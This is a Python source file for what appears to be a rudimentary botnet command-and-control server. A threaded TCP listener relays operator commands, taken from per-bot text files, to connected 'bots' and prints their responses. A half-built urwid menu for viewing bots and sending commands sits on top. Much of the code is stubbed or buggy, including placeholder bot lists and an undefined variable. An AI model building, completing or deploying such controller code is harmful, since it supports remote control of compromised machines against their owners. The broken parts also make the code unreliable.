import threading
import socketserver
import urwid
from os.path import exists



'''
	Handles the incoming connection
	Indefinitely reads commands from the respective file & executes them
'''
class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
	def handle(self):
	
	
		client_ip = self.client_address[0]
	
		#Gets the connection data
		data = str(self.request.recv(1024), 'ascii')
		self.cur_thread = threading.current_thread()
	
		
		thread_num = self.cur_thread.name.split("-")[-1]
		client_ip = self.client_address[0]
		
		print("Client IP address ", client_ip, "Thread Number: ", thread_num)
		
		
		if (not exists("./tmpfiles/" + thread_num + ".txt")):
			f = open("tmpfiles/" + thread_num + ".txt", "x")
			f.close()
		while True:
			with open("tmpfiles/" + thread_num + ".txt", 'r+') as file:
				
			#Now, let's figure out how to get it to send commands instead!
				command = file.readline()
				if command:
					self.sendCommand(command)
					file.truncate(0)

	#Handles sending the command to the bot
	# Takes in a command string, and will send it, wait for a response, and then print the response. 
	def sendCommand(self, cmd):
		self.request.sendall(cmd.encode()) #Sends the message over to the bot
		message = self.request.recv(1024).strip().decode() #... and receives the response
		response = bytes("{}: {}".format(self.cur_thread.name, message), 'ascii').decode()
		print(response)



class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
	pass
	
def threads_check(threads):
	for thread in threads:
		name = thread.name
		#base = name.split("-")
		#base = base[0]
		#if base is "Thread":
		#	thread.shutdown()   ## FIXME not actually stoping the thread
		#print(name)

	


#----------Apologies if you have to look below this line... -----------#
#It's a load of poorly put-together junk 

#Should return the list of bot choices for the menu
#Right now returns junk!
def get_bots():
	return ["1", "2"]

#Creates the basic class for a menu button
# Takes in the button text (caption), and callback(action to be taken)
class MenuButton(urwid.Button):
	def __init__(self, caption, callback):
		super(MenuButton, self).__init__("")
		#Connects the click signal to execute whatever the callback is
		urwid.connect_signal(self, 'click', callback)
		#Just stylizes the text...
		self._w = urwid.AttrMap(urwid.SelectableIcon(['  \N{BULLET} ', caption], 2), None, 'selected')

#Actually creates a menu frame...
# Takes in the caption (menu title), and a list of choices
# to be made into buttons
class Menu(urwid.WidgetWrap):
	def __init__(self, caption, choices):
		super(Menu, self).__init__(MenuButton([caption, "\N{HORIZONTAL ELLIPSIS}"], self.open_menu))
		line = urwid.Divider('\N{LOWER ONE QUARTER BLOCK}')
		#Creates the "list" of choices
		listbox = urwid.ListBox(urwid.SimpleFocusListWalker([
			urwid.AttrMap(urwid.Text(["\n", caption]), 'heading',),
			urwid.AttrMap(line, 'line'),
			urwid.Divider()] + choices + [urwid.Divider()]))
		self.menu = urwid.AttrMap(listbox, 'options')
	def open_menu(self, button):
		top.open_box(self.menu)

def exit_menu(key):
	raise urwid.ExitMainLoop()

#Defines a "Bot Choice" class that will contain all the information
# for bots
# "info" will be a list of strings giving bot info
class BotChoice(urwid.WidgetWrap):
	def __init__(self, botNum, info):
		super(BotChoice, self).__init__(MenuButton(botNum, self.item_chosen))
		self.botNum = botNum
	def item_chosen(self, button):
		infoList = []
		infoList.append(urwid.Text(["Viewing information for ", self.caption, "\n"]))
		for i in info:
			infoList.append(urwid.Text([i], ))
			

#Random Junk that just gives colors & junk
palette = [
    (None,  'light gray', 'black'),
    ('heading', 'black', 'light gray'),
    ('line', 'black', 'light gray'),
    ('options', 'dark gray', 'black'),
    ('focus heading', 'white', 'dark red'),
    ('focus line', 'black', 'dark red'),
    ('focus options', 'black', 'light gray'),
    ('selected', 'white', 'dark blue')]
focus_map = {
    'heading': 'focus heading',
    'options': 'focus options',
    'line': 'focus line'}


class HorizMenus(urwid.Columns):
	def __init__(self):
		super(HorizMenus, self).__init__([], dividechars = 1)
	
	def open_box(self, box):
		if self.contents:
			del self.contents[self.focus_position + 1:]
		self.contents.append((urwid.AttrMap(box, 'options', focus_map),
				self.options('given', 24)))
		self.focus_position = len(self.contents) - 1

		

menu_top = Menu("Main Menu", [
			Menu("Bot Information", get_bots()),
			Menu("Send Commands", [])]) #Have get_bots return a list of bot "Choices"?
			

if __name__ == "__main__":
	# Port 0 means to select an arbitrary unused port
	HOST, PORT = "", 8000
	

	server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
	
	#Fixes a bug where closing and reopening the server too quickly
	# gives a "port already in use" error

	socketserver.TCPServer.allow_reuse_address = True


	with server:
		ip, port = server.server_address
		#print("here")
		# Start a thread with the server -- that thread will then start one
		# more thread for each request
		server_thread = threading.Thread(target=server.serve_forever)
		
		
		# Exit the server thread when the main thread terminates
		server_thread.daemon = True
		server_thread.start()
		print("Server loop running in thread:", server_thread.name)
		
		top = HorizMenus()
		top.open_box(menu_top.menu)
		urwid.MainLoop(urwid.Filler(top, 'middle', 10), palette).run()

'''
		while True:
			
			# BELOW is meant to check the threads 
			#threads = threading.enumerate()
			#print(threading.activeCount())
			#threads_check(threads)
			
			command = input("enter a command:\n")
			print(command)
			bots = input("which bots should run this? ").split(",")
			print(bots)
			for bot in bots:
				with open("tmpfiles/" + bot.strip() + ".txt", 'w') as file:
					print("Writing", command)
					file.write(command)
	#server.shutdown()

'''
